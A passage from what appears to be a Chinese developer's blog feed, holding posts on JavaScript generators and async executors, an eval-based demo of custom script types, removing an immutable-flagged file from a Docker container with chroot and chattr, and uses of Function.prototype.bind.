class="built_in">require</span>(<span class="string">'fs'</span>).promises</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">autorun</span> (<span class="params">gen</span>) </span>&#123;</span><br><span class="line">  (<span class="function"><span class="keyword">function</span> <span class="title">next</span> (<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> ret = gen.next(data)</span><br><span class="line">    <span class="keyword">if</span> (ret.done) <span class="keyword">return</span></span><br><span class="line">    ret.value.then(<span class="function"><span class="params">data</span> =&gt;</span> next(data.toString()))</span><br><span class="line">  &#125;)()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> *<span class="title">readFiles</span> (<span class="params">...filenames</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (fn <span class="keyword">of</span> filenames) &#123;</span><br><span class="line">    <span class="keyword">const</span> content = <span class="keyword">yield</span> readFile(fn)</span><br><span class="line">    <span class="built_in">console</span>.log(content)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">autorun(readFiles(<span class="string">'file1'</span>, <span class="string">'file2'</span>, <span class="string">'file3'</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"Read done"</span>)</span><br></pre></td></tr></table></figure><p>例子中的 autorun 和 runThunkifyGen 函数被称为 <strong>执行器</strong>，用于自动将流程在 Generator 和调用方之间切换，并保证读取的文件顺序。</p><p>可以看到，实际上执行器就是提取出了 callback 和 then 的部分，在这里用户需要关注的只有 readFiles 这一个函数，而两个例子中，readFiles 长得一模一样。</p><p>那么如果我们把目光着眼于更一般的场景，是否可以结合 Generator 和执行器来让其达到普适呢？答案是可以的，下面给出代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">async</span> (<span class="params">fn</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">step</span> (<span class="params">gen, data</span>) </span>&#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="keyword">var</span> next = gen.next(data)</span><br><span class="line">&#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="built_in">Promise</span>.reject(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> next.done</span><br><span class="line">      ? <span class="built_in">Promise</span>.resolve(next.value)</span><br><span class="line">      : <span class="built_in">Promise</span>.resolve(next.value)</span><br><span class="line">      .then(<span class="function"><span class="params">data</span> =&gt;</span> step(gen, data))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> gen = fn()</span><br><span class="line"><span class="keyword">return</span> step(gen)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>async 函数接受一个 Generator，然后返回一个新的函数，这个函数在内部递归调用 step，这个 step 其实就是执行器（其实可以通过 IIFE 使得 step 变成单例，不过这里就不考虑这些了）。</p><p>和上面不同的地方在于，前面的两个都分别假定了 yield 后面跟随的要么是一个 thunk，要么是一个promise，而 async 则支持 yield 后面跟随一般值，能做到这一点的原因在于 Promise.resolve 和 Promise.reject ，其具体的机制可以查看MDN。</p><p>那么该如何使用 async 呢，继续回到之前按顺序打开并读取文件的例子，我们的代码会变成这样：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; readFile &#125; = <span class="built_in">require</span>(<span class="string">'fs'</span>).promises </span><br><span class="line"><span class="keyword">const</span> func1 = <span class="keyword">async</span>(<span class="function"><span class="keyword">function</span> *(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> data1 = <span class="keyword">yield</span> readFile(<span class="string">'file1'</span>)</span><br><span class="line"><span class="keyword">const</span> data2 = <span class="keyword">yield</span> readFile(<span class="string">'file2'</span>)</span><br><span class="line">  <span class="keyword">const</span> data3 = <span class="keyword">yield</span> readFile(<span class="string">'file3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'data1:'</span>, data1.toString())</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'data2:'</span>, data2.toString())</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'data3:'</span>, data3.toString())</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>已经对 async/await 有所了解的小伙伴可以发现，同样的逻辑，如果使用这一对新人，则代码会变成这样：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123; readFile &#125; = <span class="built_in">require</span>(<span class="string">'fs'</span>).promises</span><br><span class="line"><span class="keyword">const</span> func2 = <span class="keyword">async</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">const</span> data1 = <span class="keyword">await</span> readFile(<span class="string">'file1'</span>)</span><br><span class="line"><span class="keyword">const</span> data2 = <span class="keyword">await</span> readFile(<span class="string">'file2'</span>)</span><br><span class="line">  <span class="keyword">const</span> data3 = <span class="keyword">await</span> readFile(<span class="string">'file3'</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'data1:'</span>, data1.toString())</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'data2:'</span>, data2.toString())</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'data3:'</span>, data3.toString())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很相似，对吧？</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>一个关于 script 标签的 type 属性的另类用法</title>
      <link href="/2020/09/25/ScriptType/"/>
      <url>/2020/09/25/ScriptType/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今天出于好奇跑去 React 官网转了一圈，看到里面提供了一个 <a href="https://raw.githubusercontent.com/reactjs/reactjs.org/master/static/html/single-file-example.html" target="_blank" rel="noopener">无需构建工具</a> 的体验例子，看到代码后感觉很神奇，因为它直接在 script 里的 render 函数中写入了 JSX ，并且成功渲染到了视图里，但是这种语法显然不是被允许的，红色的 <code>Uncaught SyntaxError: expected expression, got &#39;&lt;&#39;</code> 是应该出现在 console 中的。</p><h1 id="0x01-原理及实现"><a href="#0x01-原理及实现" class="headerlink" title="0x01 原理及实现"></a>0x01 原理及实现</h1><p>思来想去，突然发现 script 中的 type 标签里并不是常规的 text/javascript ，而是非标准的 text/babel ，那么这个东西有什么影响呢？</p><p>其实把这段代码复制到一个带语法高亮的编辑器中应该就能看到异样了，比如扔进我本地使用的 vscode 时就可以发现，script 标签中并没有提供语法高亮和代码补全功能。</p><p>STFW 后得知，对于这种 type ，浏览器不会将其看作将被执行的 script ，而是当作普通的标签元素来看待，而既然这里的 type 是 babel，上面的 script:src 也引入了 babel ，那么想来编译并执行这段纯文本就是它的工作了。</p><p>知道了这个原理后，就可以写出简单的渲染方法了，代码如下：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- HTML 文件 --&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span>Render-Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"render.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"app"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  </span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/react"</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="built_in">console</span>.log(<span class="string">"Output msg to console"</span>)</span></span><br><span class="line"></span><br><span class="line">    render(</span><br><span class="line"></span><br><span class="line"><span class="handlebars"><span class="xml">      <span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>Hello, React!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">spanInputBox</span>&lt;/<span class="attr">span</span>&gt;</span> <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">        <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"alert('Hello!')"</span>&gt;</span>clickMe<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span></span><br><span class="line"><span class="handlebars"><span class="xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span>,</span></span></span><br><span class="line"></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.getElementById(<span class="string">'app'</span>)</span></span><br><span class="line"></span><br><span class="line">    )</span><br><span class="line">  <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>render.js 文件内容如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">const</span> pattern = <span class="regexp">/\s*render\s*\(\s*(&lt;.+&gt;)/g</span>s</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> scriptList = <span class="built_in">document</span>.querySelectorAll(<span class="string">'script[type="text/react"]'</span>)</span><br><span class="line"></span><br><span class="line">  globalThis.render = <span class="function"><span class="keyword">function</span> (<span class="params">template, node</span>) </span>&#123;</span><br><span class="line">    node.innerHTML = template</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> script <span class="keyword">of</span> scriptList) &#123;</span><br><span class="line">    <span class="built_in">eval</span>(script.textContent.replaceAll(</span><br><span class="line">      pattern,</span><br><span class="line">      (_, template) =&gt; <span class="string">`;render(\`<span class="subst">$&#123;template&#125;</span>\``</span>       </span><br><span class="line">    ))</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大概思路就是找到所有 type 相符的 script 标签，给 jsx 的部分加上引号，然后把整坨内容扔进 eval 里跑一下，当然现实中肯定不会这么简单粗暴，这里只能说是一个 POC 吧。</p><h1 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h1><p>没什么总结的，就是闲着没事水了一篇博客而已（</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>测试 Github Actions</title>
      <link href="/2020/09/03/GitActionsTest/"/>
      <url>/2020/09/03/GitActionsTest/</url>
      
        <content type="html"><![CDATA[<p>Congratulations to myself :-)</p>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>记一次手贱的经历与解决办法</title>
      <link href="/2020/09/01/Docker-Chattr/"/>
      <url>/2020/09/01/Docker-Chattr/</url>
      
        <content type="html"><![CDATA[<h1 id="0x0-起因"><a href="#0x0-起因" class="headerlink" title="0x0 起因"></a>0x0 起因</h1><p>一直以来对 Linux 的权限管理都仅仅停留在 “知道有这种机制存在” 的程度上，最近为某比赛出题时因为要有 getshell 的环境，所以就趁机了解了一下其中的一些理论和对应的命令。</p><p>由于我本人平时使用的是 MacOS 系统，再加上赛题环境也要扔到 docker 中，所以在学习权限管理时在 docker 里开了一个容器作为环境，测试的命令包括 chown，chroot，lsattr，chattr… 等等（这里插一句题外话，为了在容器中运行 chattr ，需要在启动时加上 <code>--cap-add LINUX_IMMUTABLE</code> 参数来为其赋予一个 capability ），在了解到可以开始创建赛题环境的程度后，我退出了容器，并运行了 <code>docker rm ...</code> 来将测试用的容器删除掉。</p><p>正当我准备开始输入命令创建新的容器时，却看到 docker 并没有正常删除测试用容器，取而代之地返回了一条蜜汁信息（这里省略了容器对应的两个哈希，该哈希对应我上文提到的那个用于测试权限管理的容器）：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Error response from daemon: container ...: driver "overlay2" failed to remove root filesystem: unlinkat /var/lib/docker/overlay2/.../diff/test/file: operation not permitted</span><br></pre></td></tr></table></figure><p>可以看到，大意是 docker 没有权限删除容器中的 /test/file 文件，比较幸运地，我记得这个文件是经历了 <code>chattr +a file</code> 处理后的文件，这个隐藏属性使得文件只可被追加新的内容而不可被删除或者修改。</p><p>起初我觉得这个问题很好解决（实际也很好解决，只不过和我开始想的不同），如果是在 docker for linux 上，直接在宿主机切到对应的目录后运行 <code>chattr -a file</code> 去掉隐藏属性，然后继续运行 <code>docker rm ...</code> 删掉容器即可；docker for macos 无非就是多了一层 HyperKit，可以用 screen 进入到 vm 中（我本机上是 <code>screen ~/Library/Containers/com.docker.docker/Data/vms/0/tty</code>），然后进行和上文相同的操作。</p><p>然而进去才发现，这个 vm 提供的命令太少了，根本没有 chattr 命令可用，尝试搜索是否有等效的命令可用也没有搜到，更没有人手贱到和我一样，所以现在的场景也没有先人的经验可以学习。虽然这一个容器本身并没有占多大的空间，但是强迫症使然，我还是想把它删除掉:-P</p><h1 id="0x1-解决办法"><a href="#0x1-解决办法" class="headerlink" title="0x1 解决办法"></a>0x1 解决办法</h1><h2 id="0x10-Hard-Reset"><a href="#0x10-Hard-Reset" class="headerlink" title="0x10 Hard Reset"></a>0x10 Hard Reset</h2><p>最初我尝试自己在 StackOverflow 上提出了这一问题，然而也不知道是因为环境描述的不到位还是因为自己小学水平的英文写作能力，下面的答复甚至都没有对应到这个问题上…</p><p>只有一位老哥给了还算靠谱的答复，他建议我强制重置 docker desktop for mac 的状态（Troubleshoot/Reset disk image 或者 Troubleshoot/Reset to factory defaults），这俩都会清空当前的所有的镜像和容器，后者还会顺手把应用重置成刚被安装后的状态。</p><p>确实是一个解决办法，不过因为我平时都是把 docker 当虚拟机用的，所以本机上存着各种镜像，其中还包括好多自定制的，一个一个导出来实在是太过麻烦，而我又不怎么了解这些镜像是怎么个存储机制，胡乱备份的话还担心弄出别的问题，所以就放弃了这个办法。</p><h2 id="0x11-Chroot"><a href="#0x11-Chroot" class="headerlink" title="0x11 Chroot"></a>0x11 Chroot</h2><p>在 vm 里畅游了一阵子后，我偶然发现这货还是有 chroot 可以用的，于是随便切到一个包含根目录的容器层里（我本机的路径是 <code>/var/lib/docker/overlay2/.../diff</code> ，这里依然省略了哈希），试着执行了一下 <code>chroot . /bin/bash</code> ，虽然给了一条 <code>groups: cannot find name for group ID 11</code> 的奇怪信息，不过还是顺利地进入到了 bash 环境中，而且测试了一下后发现 chattr 命令可用。</p><p>这样的话就好办多了，<strong>在无法删除的文件所在的文件夹或父文件夹中构建出 chattr 的运行环境，然后利用 chroot 运行 <code>chattr -a file</code> 来删除文件的隐藏属性，再在宿主机中运行 <code>docker rm ...</code> 即可</strong></p><p>在其他容器中（下文用 other 来指代）用 ldd 查看下 chattr 依赖的动态链接库，得到结果如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@docker-desktop:/# ldd $(which chattr)</span><br><span class="line">        linux-vdso.so.1 (0x00007ffebb9fc000)</span><br><span class="line">        libe2p.so.2 =&gt; /lib/x86_64-linux-gnu/libe2p.so.2 (0x00007f6ce8b0a000)</span><br><span class="line">        libcom_err.so.2 =&gt; /lib/x86_64-linux-gnu/libcom_err.so.2 (0x00007f6ce8906000)</span><br><span class="line">        libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f6ce8515000)</span><br><span class="line">        libpthread.so.0 =&gt; /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f6ce82f6000)</span><br><span class="line">        /lib64/ld-linux-x86-64.so.2 (0x00007f6ce8f17000)</span><br></pre></td></tr></table></figure><p>可以看到依赖库都在 /lib/x86_64-linux-gnu/ 和 /lib64/ 文件夹中，所以在目标文件夹（这里指无法删除的文件 file 所在的文件夹）中用 <code>cp -R</code> 把 other 中这两个文件夹中的内容拷贝过来，再把 chattr 的 ELF 文件拷到目标文件夹中，最后在目标文件夹中运行 <code>chroot . ./chattr -a file</code> 即可。</p><p>删除了隐藏属性后，切回到宿主机中，然后运行 <code>docker rm ...</code> 就可以顺利删除掉这个出了问题的容器了。</p>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CTF练习集</title>
      <link href="/2020/08/04/CTF-Exercises/"/>
      <url>/2020/08/04/CTF-Exercises/</url>
      
        <content type="html"><![CDATA[<script>window.location = "https://www.cnblogs.com/yuren123/"</script><p>如果看到这段话，说明自动跳转没有作用，请访问<a href="https://www.cnblogs.com/yuren123/" target="_blank" rel="noopener">链接</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>函数 Function.prototype.bind 的几个场景</title>
      <link href="/2020/08/04/FunctionBind/"/>
      <url>/2020/08/04/FunctionBind/</url>
      
        <content type="html"><![CDATA[<h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>一直以来都没想到 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/bind" target="_blank" rel="noopener">bind</a> 函数的具体应用场景，最近读某源码时偶然在一个类声明中看到了下面第一个场景中的代码，由此联想到了一些其他内容，这里记录一下</p><h1 id="0x1-第一个场景"><a href="#0x1-第一个场景" class="headerlink" title="0x1 第一个场景"></a>0x1 第一个场景</h1><p>相关的核心代码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 类名为 Directive</span></span><br><span class="line"><span class="keyword">this</span>._update = <span class="function"><span class="keyword">function</span> (<span class="params">val</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.update(val) <span class="comment">//该方法同样被定义在该类中，用于更新属性，这里因篇幅原因不给出</span></span><br><span class="line">&#125;.bind(<span class="keyword">this</span>)</span><br></pre></td></tr></table></figure><p>该方法在这个类之后的代码中被作为回调函数传给了另一个 Watcher 对象，代码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> watcher = <span class="keyword">this</span>._watcher = <span class="keyword">new</span> Watcher(..., <span class="keyword">this</span>._update)</span><br></pre></td></tr></table></figure><p>这个 Watcher 对象<strong>将 _update 函数作为一个属性保存在了自己的作用域</strong>中，并在用户触发相应的事件后执行回调。</p><p>这个场景下的本意是 Watcher 在监测到事件发生后调用 Directive._update 方法来更新对应的 Directive 实例中的属性，然而我们知道，Javascript 中的 this 是会根据上下文进行变化的（这里不考虑箭头函数等特殊情况），当 Watcher 把 _update 作为自己的属性时，这个 this 就从 Directive 变成 Watcher 了，之后的更新也都会发生在 Watcher 中，这显然偏离了本意。</p><p>而 bind 的作用在于，它强制绑定了代码中 this 的值，使这个函数在赋值给其他对象作为属性且通过该对象进行调用时依然以 bind 中的参数作为 this ，在这里就达到了场景本身的需求。</p><h1 id="0x2-第二个场景"><a href="#0x2-第二个场景" class="headerlink" title="0x2 第二个场景"></a>0x2 第二个场景</h1><p>上面的例子并不是一个经常会遇到的场景，下面给出一个更普遍一些的情况：假设我们在视图中有一系列按钮通过绑定事件来操作一个 Object 中的属性，由于在 js 的逻辑中也有可能用到同样的属性操作，所以这些操作可以作为该对象的方法，然后将该方法作为回调函数传给对应的 Listener ，代码大概如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这段代码因为没有具体上下文所以可能显得有些刻意，不过足够说明问题本身了</span></span><br><span class="line"><span class="keyword">let</span> runTime = <span class="keyword">new</span> (<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.data = <span class="number">0</span></span><br><span class="line">  <span class="keyword">this</span>.addData = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.data++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> btn = <span class="built_in">document</span>.querySelector(<span class="string">'#btn-addData'</span>);</span><br><span class="line">btn.onclick = runTime.addData;</span><br></pre></td></tr></table></figure><p>这里试图在点击一个按钮后将 runTime.data 自增，在将回调函数绑定到 click 事件时使用了 <code>btn.onclick = runTime.addData</code> 这样的语句，然而需要注意的是，在绑定后，addData 中的 this 就不再是 runTime ，而是 btn 了，这样在点击后就会尝试递增 btn.data ，从而偏离了本意。</p><p>正确的做法和前面的例子一样，应该在 addData 的函数定义后加入 <code>.bind(this)</code> 语句，从而将 this 强制绑定为 runTime 对象。</p><h1 id="0x3-第三个场景"><a href="#0x3-第三个场景" class="headerlink" title="0x3 第三个场景"></a>0x3 第三个场景</h1><p>另外上面给出的 MDN 的<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/b" target="_blank" rel="noopener">链接</a>中也有几个场景，不过我认为其中受用面最大的应该是 “快捷调用” 的场景，这里为了查阅方便来转述一下</p><p>场景的意图在于给经常调用的长对象方法提供一个捷径，比如想通过 Array.prototype.slice 来将一个类数组对象转换为真正的数组时，常规写法可能是</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> slice = <span class="built_in">Array</span>.prototype.slice</span><br><span class="line">...</span><br><span class="line">slice.apply(<span class="built_in">arguments</span>)</span><br></pre></td></tr></table></figure><p>但是当这个函数需要经常被调用时，slice.apply 的写法还是有些令人厌烦，这时可以利用 bind 来将 apply 的 this 绑定为 Array.prototype.slice（这个 this 指的是 “apply 作为谁的方法被调用” 中的 “谁” 而不是 apply 的第一个参数），从而通过直接调用绑定后的函数（包装函数）来达到目的，代码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> slice = <span class="built_in">Function</span>.prototype.apply.bind(<span class="built_in">Array</span>.prototype.slice)</span><br><span class="line">...</span><br><span class="line">slice(<span class="built_in">arguments</span>)</span><br></pre></td></tr></table></figure><p>这样就缩短了调用方法时所需的长前缀，写起来就能更愉快一些。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>记一段 Js 代码的解读与思考</title>
      <link href="/2019/12/11/JS-Inspection/"/>
      <url>/2019/12/11/JS-Inspection/</url>
      
        <content type="html"><![CDATA[<h1 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h1><p>最近逛别人博客的时候，偶然看到了下面这货：</p><blockquote><div id="yuren-content"></div></blockquote><p>立刻就被这个简约的小东西给吸引住了，于是对着它就是一发审查元素，想看看其具体的实现，在把主要的部分提取出来后得到如下内容：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Test<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"utf8"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">"binft"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> binft=<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">m</span>(<span class="params">a</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> d=<span class="built_in">document</span>.createDocumentFragment(),c=<span class="number">0</span>;a&gt;c;c++)&#123;<span class="keyword">var</span> b=<span class="built_in">document</span>.createElement(<span class="string">"span"</span>);b.textContent=<span class="built_in">String</span>.fromCharCode(<span class="number">94</span>*<span class="built_in">Math</span>.random()+<span class="number">33</span>);b.style.color=f[<span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random()*f.length)];d.appendChild(b)&#125;<span class="keyword">return</span> d&#125;<span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> d=h[a.skillI];a.step?a.step--:(a.step=k,a.prefixP&lt;b.length?(<span class="number">0</span>&lt;=a.prefixP&amp;&amp;(a.text+=b[a.prefixP]),a.prefixP++):<span class="string">"forward"</span>===a.direction?a.skillP&lt;d.length?(a.text+=d[a.skillP],a.skillP++):a.delay?a.delay--:(a.direction=<span class="string">"backward"</span>,</span></span><br><span class="line"><span class="javascript">a.delay=l):<span class="number">0</span>&lt;a.skillP?(a.text=a.text.slice(<span class="number">0</span>,<span 